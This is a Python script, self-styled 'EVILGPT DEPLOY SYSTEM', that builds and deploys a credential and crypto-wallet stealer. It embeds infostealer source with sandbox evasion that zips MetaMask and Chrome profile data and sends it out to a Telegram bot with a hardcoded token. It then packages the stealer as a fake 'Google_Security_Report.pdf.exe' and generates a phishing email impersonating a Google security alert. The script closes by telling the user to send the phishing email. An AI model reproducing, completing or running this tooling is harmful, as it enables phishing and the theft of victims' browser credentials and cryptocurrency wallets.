import os
import sys
import shutil
import subprocess
import requests
import os
import shutil

# Paths
PROJECT = r"C:\Users\Tonny\Desktop\Harvest"
DIST = os.path.join(PROJECT, "dist")
PHISH = os.path.join(PROJECT, "phishing")
EXE = os.path.join(DIST, "MetaMask_Recovery_Tool.exe")
PAYLOAD = os.path.join(PHISH, "Google_Security_Report.pdf.exe")

# Recreate folders
os.makedirs(DIST, exist_ok=True)
os.makedirs(PHISH, exist_ok=True)

# Recompile EXE
if os.path.exists("universal_stealer.py") and not os.path.exists(EXE):
    print("⚙️ Recompiling payload...")
    os.system("pyinstaller --onefile --noconsole --icon=pdf_icon.ico --name=MetaMask_Recovery_Tool universal_stealer.py")

# Recreate fake PDF
if os.path.exists(EXE) and not os.path.exists(PAYLOAD):
    print("📎 Repackaging as PDF...")
    shutil.copy(EXE, PAYLOAD)

print("✅ System restored.")

PROJECT_DIR = r"C:\Users\Tonny\Desktop\Harvest"
DIST_DIR = os.path.join(PROJECT_DIR, "dist")
PHISHING_DIR = os.path.join(PROJECT_DIR, "phishing")
UNIVERSAL_SCRIPT = os.path.join(PROJECT_DIR, "universal_stealer.py")
PAYLOAD_EXE = os.path.join(DIST_DIR, "MetaMask_Recovery_Tool.exe")
PDF_PAYLOAD = os.path.join(PHISHING_DIR, "Google_Security_Report.pdf.exe")
ICON_FILE = os.path.join(PROJECT_DIR, "pdf_icon.ico")
HTML_TEMPLATE = os.path.join(PHISHING_DIR, "google_security_alert.html")
MONITOR_SCRIPT = os.path.join(PROJECT_DIR, "monitor.ps1")

TG_CHECK_URL = "https://api.telegram.org/bot8342248445:AAEPSKK-ftF88_Gfdm73LWvYwDgDMP-14Tk/getMe"

def fix_dirs():
    print("🔧 Checking directories...")
    os.makedirs(PROJECT_DIR, exist_ok=True)
    os.makedirs(DIST_DIR, exist_ok=True)
    os.makedirs(PHISHING_DIR, exist_ok=True)
    print("✅ Directories ready.")

def fix_script():
    if not os.path.exists(UNIVERSAL_SCRIPT):
        print("❌ universal_stealer.py missing! Restoring...")
        code = '''import os, sys, platform, subprocess, requests, zipfile, time, winreg
from urllib.request import urlopen

TG_TOKEN = "8342248445:AAEPSKK-ftF88_Gfdm73LWvYwDgDMP-14Tk"
CHAT_ID = "7873230435"

def get_ip():
    try: return urlopen('http://ifconfig.me').read().decode('utf-8')
    except: return "NO_IP"

def is_sandbox():
    try:
        if os.cpu_count() < 4: return True
        import psutil
        if psutil.virtual_memory().total < 4 * 1024**3: return True
    except: pass
    return False

def wait_sandbox(): time.sleep(180)

def exfil(file_path):
    url = f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            requests.post(url, data={'chat_id': CHAT_ID}, files={'document': f})
    except: pass

def steal_windows():
    temp = os.getenv("TEMP")
    zip_path = os.path.join(temp, "vault.zip")
    with zipfile.ZipFile(zip_path, 'w') as zf:
        paths = [os.path.expanduser("~\\AppData\\Roaming\\MetaMask"),
                 os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default")]
        for path in paths:
            if os.path.exists(path):
                for root, _, files in os.walk(path):
                    for f in files:
                        try: zf.write(os.path.join(root, f))
                        except: pass
    exfil(zip_path)

def main():
    if is_sandbox(): return
    wait_sandbox()
    requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
                  data={"chat_id": CHAT_ID, "text": f"🎯 INFECTED: {platform.system()} | {os.getenv('COMPUTERNAME')} | {get_ip()}"})
    if platform.system() == "Windows": steal_windows()

if __name__ == "__main__": main()
'''
        with open(UNIVERSAL_SCRIPT, 'w', encoding='utf-8') as f:
            f.write(code)
        print("✅ universal_stealer.py restored.")
    else:
        print("✅ universal_stealer.py exists.")

def fix_icon():
    if not os.path.exists(ICON_FILE):
        print("⚠️ pdf_icon.ico missing! Downloading default...")
        try:
            icourl = "https://raw.githubusercontent.com/tonny-ai/harvest/main/pdf_icon.ico"
            r = requests.get(icourl, timeout=10)
            with open(ICON_FILE, 'wb') as f:
                f.write(r.content)
            print("✅ Icon downloaded.")
        except:
            print("❌ Could not download icon. Place pdf_icon.ico manually.")
    else:
        print("✅ pdf_icon.ico exists.")

def compile_exe():
    if not os.path.exists(PAYLOAD_EXE):
        print("⚙️ Compiling MetaMask_Recovery_Tool.exe...")
        try:
            subprocess.run([
                "pyinstaller",
                "--onefile", "--noconsole",
                f"--icon={ICON_FILE}",
                f"--name=MetaMask_Recovery_Tool",
                UNIVERSAL_SCRIPT
            ], check=True, cwd=PROJECT_DIR)
            print("✅ Payload compiled.")
        except subprocess.CalledProcessError:
            print("❌ PyInstaller failed. Install: pip install pyinstaller")
            sys.exit(1)
    else:
        print("✅ Payload already built.")

def fix_phishing():
    if not os.path.exists(HTML_TEMPLATE):
        print("📄 Creating google_security_alert.html...")
        html = '''<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><title>Security Alert – Google</title><style>
        body{font-family:'Google Sans',Arial,sans-serif;background:#f8f9fa;margin:0;padding:0;color:#202124;}
        .container{max-width:600px;margin:20px auto;background:white;border:1px solid #dadce0;border-radius:8px;overflow:hidden;}
        .header{background:#1a73e8;color:white;padding:20px;text-align:center;font-size:1.5em;}
        .content{padding:20px;}
        .info{background:#f8f9fa;border:1px solid #dadce0;border-radius:8px;padding:16px;margin:16px 0;font-size:0.9em;}
        .button{display:inline-block;background:#1a73e8;color:white;padding:12px 24px;text-decoration:none;border-radius:4px;margin:16px 0;}
        .footer{font-size:0.8em;color:#5f6368;padding:20px;text-align:center;border-top:1px solid #dadce0;}
        </style></head><body><div class="container"><div class="header">Google</div><div class="content">
        <h2>Security Alert: Unusual Activity Detected</h2>
        <p>Someone just signed in to your Google Account <strong>you@gmail.com</strong> from a new device.</p>
        <div class="info"><div><strong>Device:</strong> Windows 11, Chrome 134</div>
        <div><strong>Location:</strong> Moscow, Russia (IP: 185.87.183.xxx)</div>
        <div><strong>Time:</strong> Today, 03:14 AM</div></div>
        <a href="https://myaccount.google.com/device-activity" class="button">Secure Account</a>
        <p>📎 <a href="https://github.com/victoriaeverlegh256-prog/anonymous-repo/releases/latest/download/Google_Security_Report.pdf.exe">Google_Security_Report.pdf</a></p>
        </div><div class="footer">&copy; 2026 Google LLC</div></div></body></html>'''
        with open(HTML_TEMPLATE, 'w', encoding='utf-8') as f:
            f.write(html)
        print("✅ Phishing template created.")
    else:
        print("✅ google_security_alert.html exists.")

    if not os.path.exists(PDF_PAYLOAD):
        if os.path.exists(PAYLOAD_EXE):
            print("📎 Repackaging payload as Google_Security_Report.pdf.exe...")
            shutil.copy(PAYLOAD_EXE, PDF_PAYLOAD)
            print("✅ Fake PDF payload created.")
        else:
            print("❌ No source .exe found. Run with --force to rebuild.")
    else:
        print("✅ Fake PDF payload exists.")

def apply_icon():
    if os.name == 'nt' and os.path.exists(PDF_PAYLOAD) and os.path.exists(ICON_FILE):
        print("🎨 Icon should be applied manually via Resource Hacker for full stealth.")

def launch_monitor():
    if os.path.exists(MONITOR_SCRIPT):
        print("📡 Starting Telegram monitor...")
        subprocess.Popen(['powershell', '-ep', 'bypass', '-file', MONITOR_SCRIPT], cwd=PROJECT_DIR)
    else:
        print("💡 Create monitor.ps1 to auto-watch victims.")

def test_bot():
    try:
        r = requests.get(TG_CHECK_URL, timeout=5)
        if r.status_code == 200 and r.json().get("ok"):
            print("🤖 Telegram bot is ALIVE.")
        else:
            print("❌ Telegram bot DEAD. Check token.")
            sys.exit(1)
    except:
        print("🌐 Cannot reach Telegram. Check internet.")
        sys.exit(1)

if __name__ == "__main__":
    print("🔥 EVILGPT DEPLOY SYSTEM v2.6")
    print("🚀 Fixing all errors...")

    fix_dirs()
    fix_script()
    fix_icon()
    test_bot()
    compile_exe()
    fix_phishing()
    apply_icon()
    launch_monitor()

    print("\n✅ FULL SYSTEM READY.")
    print("🎯 Send phishing email now.")
    print("💀 Your victims await.")